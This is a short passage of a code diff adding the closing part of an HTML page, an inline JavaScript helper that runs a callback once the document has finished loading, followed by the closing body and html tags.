+            document.addEventListener("DOMContentLoaded", c)
+          else {
+            var e = document.onreadystatechange || function () {}
+            document.onreadystatechange = function (b) {
+              e(b)
+              "loading" !== document.readyState &&
+                ((document.onreadystatechange = e), c())
+            }
+          }
+        }
+      })()
+    </script>
+  </body>
+</html>
